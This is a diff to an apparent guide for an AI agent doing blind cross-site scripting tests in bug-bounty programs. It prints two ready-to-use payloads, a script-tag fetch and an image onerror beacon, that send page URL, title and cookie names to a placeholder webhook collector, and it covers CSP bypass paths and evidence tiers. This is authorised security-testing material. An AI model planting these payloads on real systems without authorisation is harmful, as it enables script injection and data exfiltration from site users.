@@ -81,31 +81,30 @@ survives truncation and can be updated after planting.
 The webhook endpoint serves no JavaScript and requires POST, so the
 `script src` form cannot work against it. The payload performs the request
 itself. The fetch variant is the primary fallback transport: it delivers
-both evidence tiers. The image variant is a **connection probe only** - a
-webhook needs POST with a JSON body, which an image request cannot produce,
-so a fire from it proves script execution in a `connect-src`-restricted
-context but delivers no message content. Send the fetch variant whenever
-`connect-src` permits; keep the image variant as the last-resort execution
-proof when it does not (`img-src` governs it). Both forms below are
-self-contained - each defines its own cookie-name variable, so either can
-fire alone under a CSP that blocked the other:
+both evidence tiers. The image variant sends a GET rather than the webhook's
+required JSON POST, so its success depends on whether the collector retains
+that request. Prefer fetch when `connect-src` permits; use the image variant
+when only `img-src` permits it. Either variant can carry an execution signal
+under a CSP that blocks the other:
 
 ```text
 "><script>var c=document.cookie.split(';').map(x=>x.trim().split('=')[0]).filter(Boolean).join(',');fetch('WEBHOOK_URL',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'FIRE <program>-<surface>-<field>-<runid> | '+location.href+' | '+document.title+' | cookies: '+c})})</script>
-"><img src onerror="var c=document.cookie.split(';').map(x=>x.trim().split('=')[0]).filter(Boolean).join(',');new Image().src='WEBHOOK_URL?probe='+encodeURIComponent('FIRE <program>-<surface>-<field>-<runid> | '+location.href)">
+"><img src onerror="new Image().src='WEBHOOK_URL?probe='+encodeURIComponent('FIRE <program>-<surface>-<field>-<runid> | '+location.href)">
 ```
 
-A `probe=` GET from the image variant is a connection/execution signal, not
-a reportable fire on its own; treat it as Tier 1 corroboration that joins to
-the submission record, and re-send the fetch variant on the same surface if
-only the probe fired.
+An image-variant `probe=` GET can support `Confirmed` **if** the collector
+retains the full request with the planted token, runtime `location.href`
+(origin and page), and timestamp, and those fields join to the accepted
+submission. A bare GET, truncated URL, or uncorrelated hit is only a
+connection clue; keep `Pending-OOB` until execution-specific evidence exists.
+Do not automatically resubmit to a staff queue merely to convert a weak
+signal into a finding.
 
-Both tiers ride in every fallback submission: Tier 1 execution proof
-(token, `location.href`, `document.title`) and Tier 2 extractability
-(cookie **names only**), because which fields survive the render context and
-CSP is never known in advance. Variant payloads are one submission's way of
-covering multiple plausible render shapes - not license to iterate
-submissions.
+The fetch variant can deliver Tier 1 (token, `location.href`,
+`document.title`) and Tier 2 (cookie **names only**). The image variant
+carries only the token and runtime URL; it is Tier 1 only when its full GET is
+retained and correlated. These variants cover different CSP paths, not a
+license to iterate submissions.
 
 ## Evidence Tiers
 
@@ -195,8 +194,9 @@ A blind payload does not resolve inside the run:
   and must not trigger the automatic pivot. The agent moves on to other
   hypotheses without retiring the lane.
 - Status on planting is **`Pending-OOB`** (owned by the `xss` router status
-  rules). On fire, the lane jumps straight to `Confirmed` - a callback from a
-  privileged view is browser-executed by definition.
+  rules). A correlated fire from the planted executable payload with origin
+  and page evidence becomes `Confirmed`, including a fully evidenced image
+  callback as described above. A bare collector hit remains `Pending-OOB`.
 - Register every planted payload in the retest queue with its correlation
   token, so a fire weeks later reaches a future agent.
 - End-of-run reporting must list planted-and-pending payloads with surfaces
